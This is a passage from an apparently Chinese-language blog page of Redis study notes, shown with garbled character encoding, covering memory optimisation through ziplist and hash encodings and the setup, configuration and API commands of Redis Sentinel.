·çš„æ•°æ®å¯ä»¥ä½¿ç”¨hashç»“æ„ï¼Œä½¿ç”¨äºŒçº§ç»“æ„å­˜å‚¨ä¹Ÿèƒ½å¸®æˆ‘ä»¬èŠ‚çœå†…å­˜</strong>ã€‚åŒæ—¶å¯ä»¥ä½¿ç”¨<code>hmget</code>ã€<code>hmset</code>å‘½ä»¤æ”¯æŒå­—æ®µçš„éƒ¨åˆ†è¯»å–ä¿®æ”¹ï¼Œè€Œä¸ç”¨æ¯æ¬¡æ•´ä½“å­˜å–ã€‚å¦‚ä¸‹é¢çš„jsonæ•°æ®ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"vid"</span>: <span class="string">"413368768"</span>,</span><br><span class="line">    <span class="attr">"title"</span>: <span class="string">"æœç‹å±Œä¸ç”·å£«"</span>,</span><br><span class="line">    <span class="attr">"videoAlbumPic"</span>:<span class="string">"http://photocdn.sohu.com/60160518/vrsa_ver8400079_ae433_pic26.jpg"</span>,</span><br><span class="line">    <span class="attr">"pid"</span>: <span class="string">"6494271"</span>,</span><br><span class="line">    <span class="attr">"type"</span>: <span class="string">"1024"</span>,</span><br><span class="line">    <span class="attr">"playlist"</span>: <span class="string">"6494271"</span>,</span><br><span class="line">    <span class="attr">"playTime"</span>: <span class="string">"468"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><center>æµ‹è¯•å†…å­˜è¡¨ç°</center><table><thead><tr><th align="center">æ•°æ®é‡</th><th align="center">key</th><th align="left">å­˜å‚¨ç±»å‹</th><th align="center">value</th><th align="center">é…ç½®</th><th align="center">used_mem</th></tr></thead><tbody><tr><td align="center">200w</td><td align="center">20å­—èŠ‚</td><td align="left">string</td><td align="center">json å­—ç¬¦ä¸²</td><td align="center">é»˜è®¤</td><td align="center">612.2M</td></tr><tr><td align="center">200w</td><td align="center">20å­—èŠ‚</td><td align="left">hash</td><td align="center">key-value å¯¹</td><td align="center">é»˜è®¤</td><td align="center">1.88G</td></tr><tr><td align="center">200w</td><td align="center">20å­—èŠ‚</td><td align="left">hash</td><td align="center">key-value å¯¹</td><td align="center">hash-max-ziplist-value:66</td><td align="center">535.60M</td></tr></tbody></table><p>æ ¹æ®æµ‹è¯•ç»“æ„ï¼Œç¬¬ä¸€æ¬¡é»˜è®¤é…ç½®ä¸‹ä½¿ç”¨hashç±»å‹ï¼Œå†…å­˜æ¶ˆè€—ä¸ä½†æ²¡æœ‰é™ä½åè€Œæ¯”å­—ç¬¦ä¸²å­˜å‚¨å¤šå‡º2å€ï¼Œè€Œè°ƒæ•´<code>hash-max-ziplist-value=66</code>ä¹‹åå†…å­˜é™ä½ä¸º535.60Mã€‚å› ä¸ºjsonçš„<code>videoAlbumPic</code>å±æ€§é•¿åº¦æ˜¯65ï¼Œè€Œ<code>hash-max-ziplist-value</code>é»˜è®¤å€¼æ˜¯64ï¼ŒRedisé‡‡ç”¨<code>hashtable</code>ç¼–ç æ–¹å¼ï¼Œåè€Œæ¶ˆè€—äº†å¤§é‡å†…å­˜ã€‚è°ƒæ•´é…ç½®åhashç±»å‹å†…éƒ¨ç¼–ç æ–¹å¼å˜ä¸º<code>ziplist</code>ï¼Œç›¸æ¯”å­—ç¬¦ä¸²æ›´çœå†…å­˜ä¸”æ”¯æŒå±æ€§çš„éƒ¨åˆ†æ“ä½œã€‚</p><h3 id="ç¼–ç ä¼˜åŒ–"><a href="#ç¼–ç ä¼˜åŒ–" class="headerlink" title="ç¼–ç ä¼˜åŒ–"></a>ç¼–ç ä¼˜åŒ–</h3><table><thead><tr><th>ç±»å‹</th><th>ç¼–ç æ–¹å¼</th><th>æ•°æ®ç»“æ„</th></tr></thead><tbody><tr><td>string</td><td>raw</td><td>åŠ¨æ€å­—ç¬¦ä¸²ç¼–ç </td></tr><tr><td></td><td>embstr</td><td>ä¼˜åŒ–å†…å­˜åˆ†é…çš„å­—ç¬¦ä¸²ç¼–ç </td></tr><tr><td></td><td>int</td><td>æ•´æ•°ç¼–ç </td></tr><tr><td>hash</td><td>hashtable</td><td>æ•£åˆ—è¡¨ç¼–ç </td></tr><tr><td></td><td>ziplist</td><td>å‹ç¼©åˆ—è¡¨ç¼–ç </td></tr><tr><td>list</td><td>linkedlist</td><td>åŒå‘é“¾è¡¨ç¼–ç </td></tr><tr><td></td><td>ziplist</td><td>å‹ç¼©åˆ—è¡¨ç¼–ç </td></tr><tr><td></td><td>quicklist</td><td></td></tr><tr><td>set</td><td>hashtable</td><td>æ•£åˆ—è¡¨ç¼–ç </td></tr><tr><td></td><td>intset</td><td>æ•´æ•°é›†åˆç¼–ç </td></tr><tr><td>zset</td><td>skiplist</td><td>è·³è·ƒè¡¨ç¼–ç </td></tr><tr><td></td><td>ziplist</td><td>å‹ç¼©åˆ—è¡¨ç¼–ç </td></tr></tbody></table><p>Redis å¯¹ä¸€ç§æ•°æ®ç»“æ„å®ç°å¤šç§ç¼–ç æ–¹å¼ä¸»è¦åŸå› æ˜¯Redisä½œè€…æƒ³é€šè¿‡ä¸åŒç¼–ç å®ç°æ•ˆç‡å’Œç©ºé—´çš„å¹³è¡¡ã€‚æ¯”å¦‚å½“æˆ‘ä»¬çš„å­˜å‚¨åªæœ‰10ä¸ªå…ƒç´ çš„åˆ—è¡¨ï¼Œå½“ä½¿ç”¨åŒå‘é“¾è¡¨æ•°æ®ç»“æ„æ—¶ï¼Œå¿…ç„¶éœ€è¦ç»´æŠ¤å¤§é‡çš„å†…éƒ¨å­—æ®µå¦‚æ¯ä¸ªå…ƒç´ éœ€è¦ï¼šå‰ç½®æŒ‡é’ˆï¼Œåç½®æŒ‡é’ˆï¼Œæ•°æ®æŒ‡é’ˆç­‰ï¼Œé€ æˆç©ºé—´æµªè´¹ï¼Œå¦‚æœé‡‡ç”¨è¿ç»­å†…å­˜ç»“æ„çš„å‹ç¼©åˆ—è¡¨ï¼ˆziplistï¼‰ï¼Œå°†ä¼šèŠ‚çœå¤§é‡å†…å­˜ï¼Œè€Œç”±äºæ•°æ®é•¿åº¦è¾ƒå°ï¼Œå­˜å–æ“ä½œæ—¶é—´å¤æ‚åº¦å³ä½¿ä¸º$O(n^2)$æ€§èƒ½ä¹Ÿå¯æ»¡è¶³éœ€æ±‚ã€‚</p><table><thead><tr><th>ç±»å‹</th><th>ç¼–ç </th><th>å†³å®šæ¡ä»¶</th></tr></thead><tbody><tr><td>hash</td><td>ziplist</td><td>æ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼š<br>value æœ€å¤§ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰&lt;= hash-max-ziplist-value<br>field ä¸ªæ•° &lt;= hash-max-ziplist-entries</td></tr><tr><td></td><td>hashtable</td><td>æ»¡è¶³ä»»æ„æ¡ä»¶ï¼š<br>value æœ€å¤§ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰&gt; hash-max-ziplist-value<br>field ä¸ªæ•° &gt; hash-max-ziplist-entries</td></tr><tr><td>list</td><td>ziplist</td><td>æ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼š<br>value æœ€å¤§ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰&lt;= list-max-ziplist-value<br>é“¾è¡¨é•¿åº¦ &lt;= list-max-ziplist-entries</td></tr><tr><td></td><td>linkedlist</td><td>æ»¡è¶³ä»»æ„æ¡ä»¶ï¼š<br>value æœ€å¤§ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰&gt; list-max-ziplist-value<br>é“¾è¡¨é•¿åº¦ &gt; list-max-ziplist-entries</td></tr><tr><td></td><td>quicklist</td><td>list-max-ziplist-sizeï¼šè¡¨ç¤ºæœ€å¤§å‹ç¼©ç©ºé—´æˆ–é•¿åº¦<br>æœ€å¤§ç©ºé—´ä½¿ç”¨[-5-1]èŒƒå›´é…ç½®ï¼Œé»˜è®¤-2 è¡¨ç¤º 8KB<br>æ­£æ•´æ•°è¡¨ç¤ºæœ€å¤§å‹ç¼©é•¿åº¦<br>list-compress-depthï¼šè¡¨ç¤ºæœ€å¤§å‹ç¼©æ·±åº¦ï¼Œé»˜è®¤ä¸º 0 è¡¨ç¤ºä¸å‹ç¼©</td></tr><tr><td>set</td><td>intset</td><td>æ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼š<br>å…ƒç´ å¿…é¡»ä¸ºæ•´æ•°<br>é›†åˆé•¿åº¦ &lt;= set-max-intset-entries</td></tr><tr><td></td><td>hashtable</td><td>æ»¡è¶³ä»»æ„æ¡ä»¶ï¼š<br>å…ƒç´ éæ•´æ•°ç±»å‹<br>é›†åˆé•¿åº¦ &gt; set-max-ziplist-entries</td></tr><tr><td>zset</td><td>ziplist</td><td>æ»¡è¶³æ‰€æœ‰æ¡ä»¶ï¼š<br>value æœ€å¤§ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰&lt;= zset-max-ziplist-value<br>æœ‰åºé›†åˆé•¿åº¦ &lt;= zset-max-ziplist-entries</td></tr><tr><td></td><td>skiplist</td><td>æ»¡è¶³ä»»æ„æ¡ä»¶ï¼š<br>value æœ€å¤§ç©ºé—´ï¼ˆå­—èŠ‚ï¼‰&gt; zset-max-ziplist-value<br>æœ‰åºé›†åˆé•¿åº¦ &gt; zset-max-ziplist-entries</td></tr></tbody></table><p>ziplistç¼–ç ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†èŠ‚çº¦å†…å­˜ï¼Œå› æ­¤æ‰€æœ‰æ•°æ®éƒ½æ˜¯é‡‡ç”¨çº¿æ€§è¿ç»­çš„å†…å­˜ç»“æ„ã€‚ziplistç¼–ç æ˜¯åº”ç”¨èŒƒå›´æœ€å¹¿çš„ä¸€ç§ï¼Œå¯ä»¥åˆ†åˆ«ä½œä¸ºhashã€listã€zsetç±»å‹çš„åº•å±‚æ•°æ®ç»“æ„å®ç°ã€‚å…¶å†…éƒ¨ç»“æ„å¦‚å›¾ï¼š<br><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g982kp4di3j30lh0fadim.jpg" alt=""></p><p>ziplistç‰¹ç‚¹å¦‚ä¸‹ï¼š</p><ul><li>å†…éƒ¨è¡¨ç°ä¸ºæ•°æ®ç´§å‡‘æ’åˆ—çš„ä¸€å—è¿ç»­å†…å­˜æ•°ç»„ã€‚</li><li>å¯ä»¥æ¨¡æ‹ŸåŒå‘é“¾è¡¨ç»“æ„ï¼Œä»¥$O(1)$æ—¶é—´å¤æ‚åº¦å…¥é˜Ÿå’Œå‡ºé˜Ÿã€‚</li><li>æ–°å¢åˆ é™¤æ“ä½œæ¶‰åŠå†…å­˜é‡æ–°åˆ†é…æˆ–é‡Šæ”¾ï¼ŒåŠ å¤§äº†æ“ä½œçš„å¤æ‚æ€§ã€‚(<strong>ziplistå‹ç¼©ç¼–ç çš„åŸåˆ™ï¼šè¿½æ±‚ç©ºé—´å’Œæ—¶é—´çš„å¹³è¡¡</strong>)</li><li>è¯»å†™æ“ä½œæ¶‰åŠå¤æ‚çš„æŒ‡é’ˆç§»åŠ¨ï¼Œæœ€åæ—¶é—´å¤æ‚åº¦ä¸º$O(n^2)$ã€‚</li><li><strong>é€‚åˆå­˜å‚¨å°å¯¹è±¡å’Œé•¿åº¦æœ‰é™çš„æ•°æ®</strong>ã€‚</li></ul><blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒRedis é€šè¿‡å¤šç§æ‰‹æ®µæ¥ä¿éšœæ€§èƒ½ï¼Œå¦‚å•çº¿ç¨‹ã€epollã€åŸºäºå†…å­˜æ“ä½œã€å†…å­˜é¢„åˆ†é…ã€è‡ªåŠ¨åˆ‡æ¢åˆç†çš„æ•°æ®ç»“æ„ç­‰ï¼Œä½œè€…åœ¨è¿™æ–¹ä¾¿åšäº†å¾ˆå¤šçš„åŠªåŠ›ï¼Œæ‰€ä»¥æ‰ä¼šæœ‰å¾ˆå¤š$O(1)$å¤æ‚åº¦æ–¹æ³•ï¼Œæ—¥åæ‰èƒ½å¤§è¡Œå…¶é“ï¼Œè¿™å…¶ä¸­æˆ‘ä»¬å¯ä»¥å€Ÿé‰´çš„ç»éªŒä¿¯æ‹¾çš†æ˜¯ï¼Œè¶³è§ä½œè€…æ˜¯ä¸€ä¸ªæœ‰è¿½æ±‚çš„ coderï¼Œç›¸ä¿¡ Redis çš„æºç ä¼šç»™ä¸æˆ‘ä»¬æ›´å¤šçš„å¯å‘ã€‚</p></blockquote><h3 id="æ§åˆ¶é”®çš„æ•°é‡"><a href="#æ§åˆ¶é”®çš„æ•°é‡" class="headerlink" title="æ§åˆ¶é”®çš„æ•°é‡"></a>æ§åˆ¶é”®çš„æ•°é‡</h3><p>å¯¹äºå­˜å‚¨ç›¸åŒçš„æ•°æ®å†…å®¹åˆ©ç”¨Redisçš„æ•°æ®ç»“æ„(å¦‚hash)é™ä½å¤–å±‚é”®çš„æ•°é‡ï¼Œä¹Ÿå¯ä»¥èŠ‚çœå¤§é‡å†…å­˜ã€‚</p><p>å»ºè®®ä½¿ç”¨Rediså­˜å‚¨å¤§é‡æ•°æ®æ—¶ï¼ŒæŠŠå†…å­˜ä¼˜åŒ–ç¯èŠ‚åŠ å…¥åˆ°å‰æœŸè®¾è®¡é˜¶æ®µï¼Œå¦åˆ™æ•°æ®å¤§å¹…å¢é•¿åï¼Œå¼€å‘äººå‘˜éœ€è¦é¢å¯¹é‡æ–°ä¼˜åŒ–å†…å­˜æ‰€å¸¦æ¥å¼€å‘å’Œæ•°æ®è¿ç§»çš„åŒé‡æˆæœ¬ã€‚<strong>å½“Rediså†…å­˜ä¸è¶³æ—¶ï¼Œé¦–å…ˆè€ƒè™‘çš„é—®é¢˜ä¸æ˜¯åŠ æœºå™¨åšæ°´å¹³æ‰©å±•ï¼Œåº”è¯¥å…ˆå°è¯•åšå†…å­˜ä¼˜åŒ–ï¼Œå½“é‡åˆ°ç“¶é¢ˆæ—¶ï¼Œå†å»è€ƒè™‘æ°´å¹³æ‰©å±•</strong>ã€‚å³ä½¿å¯¹äºé›†ç¾¤åŒ–æ–¹æ¡ˆï¼Œå‚ç›´å±‚é¢ä¼˜åŒ–ä¹ŸåŒæ ·é‡è¦ï¼Œé¿å…ä¸å¿…è¦çš„èµ„æºæµªè´¹å’Œé›†ç¾¤åŒ–åçš„ç®¡ç†æˆæœ¬ã€‚</p><h2 id="ä¼˜åŒ–æ€»ç»“"><a href="#ä¼˜åŒ–æ€»ç»“" class="headerlink" title="ä¼˜åŒ–æ€»ç»“"></a>ä¼˜åŒ–æ€»ç»“</h2><p>å†…å­˜æ˜¯ç›¸å¯¹å®è´µçš„èµ„æºï¼Œé€šè¿‡åˆç†çš„ä¼˜åŒ–å¯ä»¥æœ‰æ•ˆåœ°é™ä½å†…å­˜çš„ä½¿ç”¨é‡ï¼Œå†…å­˜ä¼˜åŒ–çš„æ€è·¯åŒ…æ‹¬</p><ul><li>ç²¾ç®€é”®å€¼å¯¹å¤§å°ï¼Œä½¿ç”¨é«˜æ•ˆäºŒè¿›åˆ¶åºåˆ—åŒ–å·¥å…·ã€‚</li><li>ä½¿ç”¨å¯¹è±¡å…±äº«æ± ä¼˜åŒ–å°æ•´æ•°å¯¹è±¡ã€‚</li><li>æ•°æ®ä¼˜å…ˆä½¿ç”¨æ•´æ•°ï¼Œæ¯”å­—ç¬¦ä¸²ç±»å‹æ›´èŠ‚çœç©ºé—´ã€‚</li><li>ä¼˜åŒ–å­—ç¬¦ä¸²ä½¿ç”¨ï¼Œé¿å…é¢„åˆ†é…é€ æˆçš„å†…å­˜æµªè´¹ã€‚</li><li>ä½¿ç”¨<code>ziplist</code>å‹ç¼©ç¼–ç ä¼˜åŒ–<code>hash</code>ã€<code>list</code>ç­‰ç»“æ„ï¼Œæ³¨é‡æ•ˆç‡å’Œç©ºé—´çš„å¹³è¡¡ã€‚</li><li>ä½¿ç”¨<code>intset</code>ç¼–ç ä¼˜åŒ–æ•´æ•°é›†åˆã€‚</li><li>ä½¿ç”¨<code>ziplist</code>ç¼–ç çš„<code>hash</code>ç»“æ„é™ä½å°å¯¹è±¡é“¾è§„æ¨¡ã€‚</li></ul><h1 id="ç¬¬-9-ç« -å“¨å…µ"><a href="#ç¬¬-9-ç« -å“¨å…µ" class="headerlink" title="ç¬¬ 9 ç«  å“¨å…µ"></a>ç¬¬ 9 ç«  å“¨å…µ</h1><h2 id="åŸºç¡€æ¦‚å¿µ"><a href="#åŸºç¡€æ¦‚å¿µ" class="headerlink" title="åŸºç¡€æ¦‚å¿µ"></a>åŸºç¡€æ¦‚å¿µ</h2><p>ä¸»ä»æ¨¡å¼ä¸‹å­˜åœ¨çš„é—®é¢˜ï¼š</p><ol><li>ä¸»èŠ‚ç‚¹å®•æœºçš„æ•…éšœè½¬ç§»éœ€è¦äººå·¥ä»‹å…¥æ¢å¤ï¼ˆğŸ‘‰ å“¨å…µï¼‰</li><li>ä¸»èŠ‚ç‚¹çš„å†™èƒ½åŠ›ä¸å­˜å‚¨èƒ½åŠ›å—åˆ°å•æœºçš„é™åˆ¶ï¼ˆğŸ‘‰ é›†ç¾¤ï¼‰</li></ol><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g994eh8oswj30lt0fr41y.jpg" alt=""></p><p>Redis Sentinel å…·æœ‰ä»¥ä¸‹å‡ ä¸ªåŠŸèƒ½ï¼š</p><ul><li>ç›‘æ§ï¼šSentinelèŠ‚ç‚¹ä¼šå®šæœŸæ£€æµ‹Redisæ•°æ®èŠ‚ç‚¹ã€å…¶ä½™SentinelèŠ‚ç‚¹æ˜¯å¦å¯è¾¾ã€‚</li><li>é€šçŸ¥ï¼šSentinelèŠ‚ç‚¹ä¼šå°†æ•…éšœè½¬ç§»çš„ç»“æœé€šçŸ¥ç»™åº”ç”¨æ–¹ã€‚</li><li>ä¸»èŠ‚ç‚¹æ•…éšœè½¬ç§»ï¼šå®ç°ä»èŠ‚ç‚¹æ™‹å‡ä¸ºä¸»èŠ‚ç‚¹å¹¶ç»´æŠ¤åç»­æ­£ç¡®çš„ä¸»ä»å…³ç³»ã€‚</li><li>é…ç½®æä¾›è€…ï¼šåœ¨Redis Sentinelç»“æ„ä¸­ï¼Œå®¢æˆ·ç«¯åœ¨åˆå§‹åŒ–çš„æ—¶å€™è¿æ¥çš„æ˜¯SentinelèŠ‚ç‚¹é›†åˆï¼Œä»ä¸­è·å–ä¸»èŠ‚ç‚¹ä¿¡æ¯ã€‚</li></ul><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><p>ä»èŠ‚ç‚¹çš„éƒ¨ç½²ä¸ä¸»èŠ‚ç‚¹çš„åŸºæœ¬ä¸€è‡´ï¼Œåªæ˜¯æ·»åŠ äº†<code>slaveof</code>é…ç½®ã€‚<br>å¯é€šè¿‡<code>info replication</code>å‘½ä»¤æŸ¥çœ‹ä»èŠ‚ç‚¹æˆ–æ‰€å±ä¸»èŠ‚ç‚¹ã€‚</p><p>å“¨å…µèŠ‚ç‚¹é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">redis-sentinel<span class="number">-26379.</span>conf</span><br><span class="line">port <span class="number">26379</span>                                                      <span class="comment">// å“¨å…µé»˜è®¤ç«¯å£</span></span><br><span class="line">daemonize yes</span><br><span class="line">logfile <span class="string">"26379.log"</span>                                             <span class="comment">// æ—¥å¿—æ–‡ä»¶</span></span><br><span class="line">dir /opt/soft/redis/data</span><br><span class="line">sentinel monitor mymaster <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">6379</span> <span class="number">2</span>                      <span class="comment">// è¯¥å“¨å…µç›‘æ§ mymaster 127.0.0.1 6379 çš„ä¸»èŠ‚ç‚¹ï¼ŒåŒæ—¶éœ€è¦ 2 ä¸ªå“¨å…µåˆ¤æ–­æ•…éšœæ‰ä¼šè¿›è¡Œæ•…éšœè½¬ç§»ã€‚æ•…éšœåˆ¤å®šå‚æ•° quorum å»ºè®®è®¾ç½®ä¸º**å“¨å…µèŠ‚ç‚¹æ•°é‡çš„ä¸€èˆ¬åŠ  1**ï¼ŒåŒæ—¶è¯¥å‚æ•°è¿˜ä¸å“¨å…µèŠ‚ç‚¹çš„é¢†å¯¼è€…é€‰ä¸¾æœ‰å…³ï¼Œè‡³å°‘éœ€è¦æœ‰ `max(quorum, num(sentinels)/2 + 1)`ä¸ªèŠ‚ç‚¹å‚ä¸é€‰ä¸¾ï¼Œæ‰èƒ½é€‰å‡ºå“¨å…µé¢†å¯¼è€…</span></span><br><span class="line">sentinel down-after-milliseconds mymaster <span class="number">30000</span>                 <span class="comment">// ç›‘æ§èŠ‚ç‚¹çš„è¶…æ—¶æ—¶é—´</span></span><br><span class="line">sentinel parallel-syncs mymaster <span class="number">1</span>                              <span class="comment">// ç”¨äºé™åˆ¶ä¸€æ¬¡æ•…éšœè½¬ç§»åï¼Œæ¯æ¬¡å‘æ–°çš„ä¸»èŠ‚ç‚¹å‘èµ·å¤åˆ¶æ“ä½œçš„ä»èŠ‚ç‚¹ä¸ªæ•°ã€‚åŒæ—¶å‘ä¸»èŠ‚ç‚¹å‘èµ·å¤åˆ¶ï¼Œå¿…ç„¶ä¼šå¯¹ä¸»æœºè¯¶å•æ‰€åœ¨æœºå™¨é€ æˆç½‘ç»œä¸ç£ç›˜å¼€é”€</span></span><br><span class="line">sentinel failover-timeout mymaster <span class="number">180000</span>                       <span class="comment">// æ•…éšœè½¬ç§»è¶…æ—¶æ—¶é—´</span></span><br><span class="line"># sentinel auth-pass &lt;master-name&gt; &lt;password&gt;                   </span><br><span class="line"># sentinel notification-script &lt;master-name&gt; &lt;script-path&gt;      <span class="comment">// åœ¨æ•…éšœ**è½¬ç§»æœŸé—´**çš„å‘Šè­¦äº‹ä»¶è„šæœ¬</span></span><br><span class="line"># sentinel client-reconfig-script &lt;master-name&gt; &lt;script-path&gt;   <span class="comment">// åœ¨æ•…éšœ**è½¬ç§»ç»“æŸå**çš„äº‹ä»¶è„šæœ¬</span></span><br></pre></td></tr></table></figure><p>å¯åŠ¨SentinelèŠ‚ç‚¹çš„å‘½ä»¤ï¼š<code>redis-sentinel</code>æˆ–<code>redis-server redis-sentinel-26379.conf --sentinel</code>ã€‚<br>å¯é€šè¿‡<code>info sentinel</code>å‘½ä»¤æŸ¥çœ‹å“¨å…µèŠ‚ç‚¹ä¿¡æ¯<br>å“¨å…µèŠ‚ç‚¹ä¼šé€šè¿‡ä¸»èŠ‚ç‚¹å‘ç°ä»èŠ‚ç‚¹ä»¥åŠå…¶å®ƒå“¨å…µèŠ‚ç‚¹ï¼Œä»è€Œå®ç°å¯¹æ‰€æœ‰èŠ‚ç‚¹çš„ç›‘æ§ã€‚</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g9bsaxy49ij30kq0eetcb.jpg" alt=""></p><p>éƒ¨ç½²æŠ€å·§</p><ul><li>å“¨å…µèŠ‚ç‚¹ä¸åº”è¯¥éƒ¨ç½²åœ¨åŒä¸€å°ç‰©ç†æœºä¸Š</li><li>éƒ¨ç½²è‡³å°‘ä¸‰ä¸ªä¸”å¥‡æ•°ä¸ªå“¨å…µèŠ‚ç‚¹</li><li>å¦‚æœå“¨å…µèŠ‚ç‚¹é›†åˆç›‘æ§çš„æ˜¯åŒä¸€ä¸ªä¸šåŠ¡çš„å¤šä¸ªä¸»èŠ‚ç‚¹é›†åˆï¼Œé‚£ä¹ˆé‡‡ç”¨ä¸€å¥—å“¨å…µèŠ‚ç‚¹ç›‘æ§å¤šä¸ªä¸»ä»èŠ‚ç‚¹ï¼Œå¦åˆ™é‡‡ç”¨å¤šä¸ªå“¨å…µèŠ‚ç‚¹ç›‘æ§å¤šä¸ªä¸»ä»èŠ‚ç‚¹çš„æ–¹æ¡ˆã€‚</li></ul><h2 id="å“¨å…µèŠ‚ç‚¹çš„-API"><a href="#å“¨å…µèŠ‚ç‚¹çš„-API" class="headerlink" title="å“¨å…µèŠ‚ç‚¹çš„ API"></a>å“¨å…µèŠ‚ç‚¹çš„ API</h2><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>sentinel masters</code></td><td>å±•ç¤ºæ‰€æœ‰è¢«ç›‘æ§çš„ä¸»èŠ‚ç‚¹çŠ¶æ€ä»¥åŠç›¸å…³ç»Ÿè®¡ä¿¡æ¯</td></tr><tr><td><code>sentinel master &lt;master name&gt;</code></td><td>å±•ç¤ºæŒ‡å®š<code>&lt;master name&gt;</code>çš„ä¸»èŠ‚ç‚¹çŠ¶æ€ä»¥åŠç›¸å…³çš„ç»Ÿè®¡ä¿¡æ¯</td></tr><tr><td><code>sentinel slaves &lt;master name&gt;</code></td><td>å±•ç¤ºæŒ‡å®š<code>&lt;master name&gt;</code>çš„ä»èŠ‚ç‚¹çŠ¶æ€ä»¥åŠç›¸å…³çš„ç»Ÿè®¡ä¿¡æ¯</td></tr><tr><td><code>sentinel sentinels &lt;master name&gt;</code></td><td>å±•ç¤ºæŒ‡å®š<code>&lt;master name&gt;</code>çš„SentinelèŠ‚ç‚¹é›†åˆï¼ˆä¸åŒ…å«å½“å‰SentinelèŠ‚ç‚¹ï¼‰</td></tr><tr><td><code>sentinel get-master-addr-by-name &lt;master name&gt;</code></td><td>è¿”å›æŒ‡å®š<code>&lt;master name&gt;</code>ä¸»èŠ‚ç‚¹çš„IPåœ°å€å’Œç«¯å£</td></tr><tr><td><code>sentinel reset &lt;pattern&gt;</code></td><td>å½“å‰SentinelèŠ‚ç‚¹å¯¹ç¬¦åˆ<code>&lt;pattern&gt;</code>ï¼ˆé€šé…ç¬¦é£æ ¼ï¼‰ä¸»èŠ‚ç‚¹çš„é…ç½®è¿›è¡Œé‡ç½®ï¼ŒåŒ…å«æ¸…é™¤ä¸»èŠ‚ç‚¹çš„ç›¸å…³çŠ¶æ€ï¼ˆä¾‹å¦‚æ•…éšœè½¬ç§»ï¼‰ï¼Œé‡æ–°å‘ç°ä»èŠ‚ç‚¹å’ŒSentinelèŠ‚ç‚¹ã€‚</td></tr><tr><td><code>sentinel failover &lt;master name&gt;</code></td><td>å¯¹æŒ‡å®š<code>&lt;master name&gt;</code>ä¸»èŠ‚ç‚¹è¿›è¡Œå¼ºåˆ¶æ•…éšœè½¬ç§»ï¼ˆæ²¡æœ‰å’Œå…¶ä»–SentinelèŠ‚ç‚¹â€œåå•†â€ï¼‰ï¼Œå½“æ•…éšœè½¬ç§»å®Œæˆåï¼Œå…¶ä»–SentinelèŠ‚ç‚¹æŒ‰ç…§æ•…éšœè½¬ç§»çš„ç»“æœæ›´æ–°è‡ªèº«é…ç½®ï¼Œè¿™ä¸ªå‘½ä»¤åœ¨Redis Sentinelçš„æ—¥å¸¸è¿ç»´ä¸­éå¸¸æœ‰ç”¨ã€‚</td></tr><tr><td><code>sentinel ckquorum &lt;master name&gt;</code></td><td>æ£€æµ‹å½“å‰å¯è¾¾çš„SentinelèŠ‚ç‚¹æ€»æ•°æ˜¯å¦è¾¾åˆ°<code>&lt;quorum&gt;</code>çš„ä¸ªæ•°</td></tr><tr><td><code>sentinel flushconfig</code></td><td>å°†SentinelèŠ‚ç‚¹çš„é…ç½®å¼ºåˆ¶åˆ·åˆ°ç£ç›˜ä¸Šï¼Œè¿™ä¸ªå‘½ä»¤SentinelèŠ‚ç‚¹è‡ªèº«ç”¨å¾—æ¯”è¾ƒå¤šï¼Œå¯¹äºå¼€å‘å’Œè¿ç»´äººå‘˜åªæœ‰å½“å¤–éƒ¨åŸå› ï¼ˆä¾‹å¦‚ç£ç›˜æŸåï¼‰é€ æˆé…ç½®æ–‡ä»¶æŸåæˆ–è€…ä¸¢å¤±æ—¶ï¼Œè¿™ä¸ªå‘½ä»¤æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚</td></tr><tr><td><code>sentinel remove &lt;master name&gt;</code></td><td>å–æ¶ˆå½“å‰SentinelèŠ‚ç‚¹å¯¹äºæŒ‡å®š<code>&lt;master name&gt;</code>ä¸»èŠ‚ç‚¹çš„ç›‘æ§ã€‚</td></tr><tr><td><code>sentinel monitor &lt;master name&gt; &lt;ip&gt; &lt;port&gt; &lt;quorum&gt;</code></td><td>ä¸é…ç½®æ–‡ä»¶ä¸­çš„å«ä¹‰æ˜¯å®Œå…¨ä¸€æ ·</td></tr><tr><td><code>sentinel set &lt;master name&gt;</code></td><td>åŠ¨æ€ä¿®æ”¹SentinelèŠ‚ç‚¹é…ç½®é€‰é¡¹ã€‚æ³¨æ„ï¼šè¯¥å‘½ä»¤åªä¼šå¯¹å½“å‰èŠ‚ç‚¹æœ‰æ•ˆï¼Œä¸”ä¿®æ”¹æˆåŠŸåä¼šç«‹å³ç”Ÿæ•ˆ</td></tr><tr><td><code>sentinel is-master-down-by-addr</code></td><td>SentinelèŠ‚ç‚¹ä¹‹é—´ç”¨æ¥äº¤æ¢å¯¹ä¸»èŠ‚ç‚¹æ˜¯å¦ä¸‹çº¿çš„åˆ¤æ–­ï¼Œæ 